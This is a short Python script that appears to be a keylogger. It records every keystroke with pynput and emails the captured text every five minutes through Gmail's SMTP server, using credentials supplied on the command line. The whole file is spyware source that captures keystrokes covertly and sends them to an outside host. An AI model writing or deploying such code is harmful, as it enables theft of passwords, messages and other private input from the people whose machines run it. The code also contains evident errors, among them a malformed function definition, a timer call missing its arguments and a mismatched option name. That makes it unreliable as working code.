import pynput.keyboard
import smtplib
import threading
import optparse
dir = ""
def options:
    opt = optparse.OptionParser()
    opt.add_option("-e","--email",dest="email",help="enter email adress")
    opt.add_option("-p", "--passwd", dest="password", help="enter password")
    (value,key) = opt.parse_args()
    return value
def logger(pack):
    global dir
    try:
        dir = dir + pack.char.encode("utf-8")
    except AttributeError:
        if pack == pack.space:
            dir = dir + " "
        else:
            dir = dir + str(pack)

def mail(email,passwd,post):
    opt = smtplib.SMTP("smtp.gmail.com",587)
    opt.starttls()
    opt.login(email,passwd)
    opt.sendmail(email,email,post)
    opt.quit()
def thread(email,passwd):
    global dir
    mail(email,passwd,dir)
    dir = " "
    timer = threading.Timer(300,thread)
    timer.start()
temp = pynput.keyboard.Listener(on_press=logger)
temp2 = options()
with temp:
    thread(temp2.email,temp2.passwd)
    temp.join()

